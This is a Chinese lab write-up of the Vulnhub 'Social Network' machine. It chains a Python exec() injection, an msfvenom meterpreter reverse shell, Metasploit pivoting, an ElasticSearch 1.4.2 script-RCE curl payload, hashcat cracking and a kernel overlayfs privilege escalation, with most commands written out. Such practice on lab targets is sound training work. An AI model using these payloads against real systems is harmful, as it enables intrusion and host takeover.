# Vulnhub | Social Network 渗透靶机

阅读量 **449891**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-05-07 16:30:29

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t016e819fa264d574b1.jpg)

## 环境：

  * 靶机：[Medium_socnet](https://www.vulnhub.com/entry/boredhackerblog-social-network,454/)
  * 攻击机：Parrot 192.168.123.233
  * 网段：192.168.123.0/24

## 靶机简介

> Leave a message is a new anonymous social networking site where users can
> post messages for each other. They’ve assigned you to test their set up.
> They do utilize docker containers. You can conduct attacks against those
> too. Try to see if you can get root on the host though.
>
> Difficulty: Med
>
> Tasks involved:
>
>   * port scanning
>   * webapp attacks
>   * code injection
>   * pivoting
>   * exploitation
>   * password cracking
>   * brute forcing
>

## 信息收集

首先先找到局域网中靶机的IP

    
    
    sudo nmap -sn 192.168.123.0/24
    

![](https://p3.ssl.qhimg.com/t01b425236a9c205c90.jpg)

得出靶机IP：192.168.123.183

###  端口扫描

    
    
    sudo nmap -sS -Pn -p- 192.168.123.183
    

![](https://p4.ssl.qhimg.com/t01798ad51d26eef0be.jpg)

通过扫描得出靶机开放了22、5000端口，5000端口是一个Python的http服务

## 访问Web

访问一下Web，应该就是靶机作者提到的留言板，看一下`Wapplyzer`识别网站是基于Flask使用Python2.7 开发的

![](https://p2.ssl.qhimg.com/t014aa3fea6267a0cb8.png)

一开始以为是SSTI(模板注入)，就输入了`{{2*2}}`发现不生效，方向错了，于是扫了扫目录

![](https://p2.ssl.qhimg.com/t01c24d27289dc7d19b.jpg)

扫出`admin`，访问看看

![](https://p3.ssl.qhimg.com/t012c81ac07c77b60e9.jpg)

简介表示后端会使用exec()函数执行我们提交的python代码，借助盲注的思路，睡眠3秒试试

![](https://p3.ssl.qhimg.com/t01425542ca685115cb.png)

成功执行，确定漏洞存在

## 反弹Shell

既然能执行Python代码，那就使用`msfvenom`生成python木马，反弹shell

启动MSF，设置Payload监听，再把生成的木马放到web提交

    
    
    msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.123.233 LPORT=4444
    

![](https://p4.ssl.qhimg.com/t015b32daae3654929d.png)

成功反弹shell，这里有个问题就是第一次反弹可能等很久都不弹meterpreter，只要把session都K掉，重新监听，木马会自动重连(也可能是我网络问题)

进入shell看看，是一个docker容器

![](https://p1.ssl.qhimg.com/t014d91dc8e5205a13d.png)

难道要docker逃逸？回头看了看靶机作者的提示，有一个`pivoting`跳板攻击，应该是以这台机器当跳板

## docker1

###  自动路由

接下来就是设置自动路由，扫描一下这个docker的局域网环境，先看看docker1的网络信息

![](https://p0.ssl.qhimg.com/t01dabceb7f2d3acf91.png)

然后使用msf的autoroute模块自动路由

    
    
    run autoroute -s 172.17.0.0/16    # 添加路由
    run autoroute -p    # 查看路由
    

![](https://p1.ssl.qhimg.com/t011494196750919182.png)

成功添加，然后配置socks服务，我这里使用sock4a，我这里socks5代理不了

![](https://p5.ssl.qhimg.com/t01319c40816c88f526.png)

接着配置proxychains配置文件，`/etc/proxychains.conf`文件末添加一行

    
    
    socks4 192.168.123.233 1080
    

接下来就可以使用proxychains代理各种工具进入docker1的172.17网段

这里可以使用proxychains代理nmap工具去尝试靶机局域网信息，但是，proxychains不代理UDP，ICMP，SYN网络协议，无法进行系统探测，主机发现等等，但是可以用`-sT`参数并结合`-Pn`进行TCP端口扫描

###  内网扫描

至于如何扫描172网段的信息，可以将nmap上传到靶机，文件GitHub上有，就在docker1本地扫描，这样就快稳很多了，记得要添加nmap执行权限

扫描结果

![](https://p2.ssl.qhimg.com/t017d46de7a2ec8a8ee.png)

找到三个机器：0.1、0.2、0.3(docker1)，把另外两个机器扫扫端口

172.17.0.1

![](https://p4.ssl.qhimg.com/t0114b21ab1ce52515b.png)

这个开放22端口，应该就是宿主机了

172.17.0.2，这个我尝试在靶机使用proxychains代理nmap扫描端口

    
    
    proxychains nmap -sT -Pn -p- 172.17.0.2
    

![](https://p4.ssl.qhimg.com/t01a3bf3f41ba10c738.png)

开放9200和9300端口，通过搜索发现9200和9300端口是`ElasticSearch`的服务端口，是一个基于Lucene的搜索服务器，使用Java语言开发的

###  查找服务漏洞

通过浏览器访问172.17.0.2:9200，记得使用proxychain代理整个浏览器，找到版本号`1.4.2`

![](https://p3.ssl.qhimg.com/t0106ef893f807250a6.png)

随后通过exploit-db搜索发现该版本的服务有远程命令漏洞，再通过`searchsploit`搜索Exploit

![](https://p5.ssl.qhimg.com/t010aa6d5ef486f9208.png)

通过MSF搜索EXP

![](https://p1.ssl.qhimg.com/t012a9a430f63054f20.png)

###  确定漏洞

到此整一个网络拓扑如下

![](https://p0.ssl.qhimg.com/t01c2d8cbd2d4373fd1.png)

**漏洞利用失败**

找到36337.py文件，尝试利用，发现失败

![](https://p2.ssl.qhimg.com/t01e589f9e31c8973a9.png)

随后我又通过MSF的exp进行利用，均已失败告终，于是又手动提交payload发现还是不行，于是就开始寻找原因

###  找到原因

终于在[Github](https://github.com/YrenWu/Elhackstic)找到失败原因，原因是服务里面没有数据，所以不能通过search来搜索进而执行命令，问题找到，尝试随便插入一条数据

    
    
    proxychains curl -XPOST 'http://172.17.0.2:9200/twitter/user/yren' -d '{ "name" : "Wu" }'
    

再次执行Payload

    
    
    proxychains curl -XPOST 'http://172.17.0.2:9200/_search?pretty' -d '{"script_fields": {"payload": {"script": "java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("whoami").getText()"}}}'
    

成功执行

![](https://p4.ssl.qhimg.com/t0133b18c17572b3531.png)

再次使用36337.py，还是失败呢，于是看了一下源码，是用python2写的，修改了一下代码，添加一个插入数据的函数

![](https://p3.ssl.qhimg.com/t01e2e1a1b630999012.png)

![](https://p4.ssl.qhimg.com/t018c1f356cc420f7e4.png)

代理运行即可

![](https://p4.ssl.qhimg.com/t01275e9613251174d2.png)

## docker2

发现一个`passwords`文件

![](https://p2.ssl.qhimg.com/t01b7e8943c2d225569.png)

内容如下：

    
    
    Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase
    Example: 1234abcd
    john:3f8184a7343664553fcb5337a3138814
    test:861f194e9d6118f3d942a72be3e51749
    admin:670c3bbc209a18dde5446e5e6c1f1d5b
    root:b3d34352fc26117979deabdf1b9b6354
    jane:5c158b60ed97c723b673529b8a3cf72b
    

###  Hashcat破解

看样子是提示我们使用`hashcat`破解hash值，Format就是模板，使用hashcat的掩码攻击，OK，先把hash提取出来，保存为一个文件，一起破解，不熟悉hashcat可以看一下前辈写的[文章](https://www.freebuf.com/sectool/164507.html)

    
    
    hashcat -m 0 -a 3 pwd.hash ?d?d?d?d?l?l?l?l --force
    

-m 0 指哈希类型是md5 ， -a 3 指掩码攻击，根据提示，前四位为数字，后四位为小写字母，?d代表数字，?l代表小写字母

很快就破解出来了

![](https://p3.ssl.qhimg.com/t018ae12e9043b6c63e.png)

这个用户名密码估计是用于宿主机SSH登录

尝试登录发现只有`john`这个用户可以登陆上去

## 宿主机

![](https://p5.ssl.qhimg.com/t017fc096392a4d4cef.png)

接下来到处看看，发现没有什么东西，看了一下passwd文件，发现除了john用户，passwords文件中提到的用户一个都没有，emm，想了一下，应该是要直接提权了

###  提权

通过以下任意一条命令查看有没有可以SUID提权的命令

    
    
    find / -perm -u=s -type f 2>/dev/null
    find / -user root -perm -4000 -print 2>/dev/null
    find / -user root -perm -4000 -exec ls -ldb {} ;
    

发现并没有熟悉的vim、find等等之类的，再来看看`sudo`

![](https://p1.ssl.qhimg.com/t017a4b266798f722a3.png)

哦嚯，连sudo权限都没有，最后看看Linux内核版本，系统版本有没有什么提权漏洞

    
    
    uname -a
    cat /etc/version
    lsb_release -a
    

通过以上命令收集到系统版本信息

  * Linux 3.13.0-24-generic x86_64 内核2014发布的
  * Ubuntu 14.0.4 LTS

通过以上信息使用searchsploit看看有没有提权EXP

    
    
    searchsploit linux 3.13.0 ubuntu priv
    

找到一个

![](https://p2.ssl.qhimg.com/t01adb88eda967df98a.png)

二话不说丢到宿主机上编译，惊喜的发现木有gcc，OK，那我在线安装行不行？对不起你没有权限，那我离线安装行不行？对不起你没有rpm命令你需要安装，与需要一份工作来获得工作经验有异曲同工之妙。

然后搜索发现可以尝试在本地编译之后再上传上去，随后我就用VPS Pull了一个Ubuntu14.04的镜像，把exp源码上传上去编译，再丢回靶机运行发现

![](https://p1.ssl.qhimg.com/t016a3f825f6de6073e.png)

编译之后运行还需要编译，认真看一下回显信息，发现除了gcc报错，之前的动作都是正常执行的，然后看一下源码

发现在143行执行了一条命令用来编译生成`ofs-lib.so`文件

![](https://p4.ssl.qhimg.com/t01a4acd534351a5798.png)

错误就出现在这里，然后往上看，找找这个`ofs-lib.c`的文件内容是什么

![](https://p5.ssl.qhimg.com/t01a754d61f8626ac31.png)

就在编译命令的上两行找到，这个文件写入`LIB`变量的内容，最终找到这个`LIB`是常量

![](https://p2.ssl.qhimg.com/t010ebb32dca835197e.png)

再根据尝试提权反馈的信息与源码进行对比分析，基本可以肯定再执行gcc编译之前的代码都是正常执行的，那么就是说只要解决了这个`ofs-lib.so`文件就有很大概率能成功提权，我有两个思路

**思路一**

修改EXP代码，把main函数中的if判断注释掉，因为我用于编译的docker镜像内核与靶机内核不一样，会出错

![](https://p4.ssl.qhimg.com/t017c1f37d6d9213f58.png)

把133-136行的代码注释掉

![](https://p2.ssl.qhimg.com/t01d32dd7d014a36e9a.png)

保存，重新编译、运行，在/tmp目录下找到`ofs-lib.so`文件，再次修改，取消刚刚的注释，注释143-147行gcc编码以及判断代码

![](https://p3.ssl.qhimg.com/t013a9e9237be1e3208.png)

重新编译，生成我们最终的EXP，把`osf-lib.so`文件与最终的EXP上传到靶机的 **`/tmp`** 目录下，赋权限，执行EXP

![](https://p2.ssl.qhimg.com/t012c4bf3c69b6b6f31.png)

成功提权

**思路二**

把`LIB`的内容复制出来，写入文件，用EXP的里面的gcc编译命令编译出`ofs-lib.so`，注释原EXP
gcc编译那行代码，编译最终EXP，与.so文件一同上传到靶机`/tmp`目录，赋权限执行即可。

## 总结

做这个靶机我遇到两个坑，一就是`searchsploit`中原本没有数据，不满足漏洞利用条件，不能盲目的使用EXP；二就是提权时候。整个靶机下来最大感受就是要善于利用搜索引擎以及Github，几乎每次遇到问题上Github都会有意想不到的收获。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **YCheung** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/204066](/post/id/204066)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [靶机](/tag/靶机)
  * [Vulnhub](/tag/Vulnhub)

 **+1** __7赞

 __收藏

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg) YCheung

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

